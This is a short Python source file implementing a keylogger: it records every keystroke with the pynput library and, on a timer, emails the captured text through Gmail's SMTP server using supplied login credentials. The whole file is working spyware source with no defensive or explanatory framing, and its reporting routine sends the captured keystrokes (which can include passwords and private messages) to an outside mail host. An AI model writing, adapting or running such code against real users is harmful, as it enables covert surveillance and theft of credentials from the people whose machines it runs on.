import smtplib
import pynput.keyboard
import threading

class Keylogger:

    def __init__(self, email, password, interval):
        self.content = "Keylogger Started"
        self.email = email
        self.password = password
        self.interval = interval

    def process_key_strike(self, key):
        try:
            self.content = self.content + str(key.char)
        except AttributeError:
            if key == key.space:
                self.content = self.content + " "
            else:
                self.content = self.content + " " + str(key) + " "

    def report(self):
        self.send_mail(self.email, self.password, self.content)
        self.content = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)


    def start(self):
        my_listener = pynput.keyboard.Listener(on_press=self.process_key_strike)
        with my_listener:
            self.report()
            my_listener.join()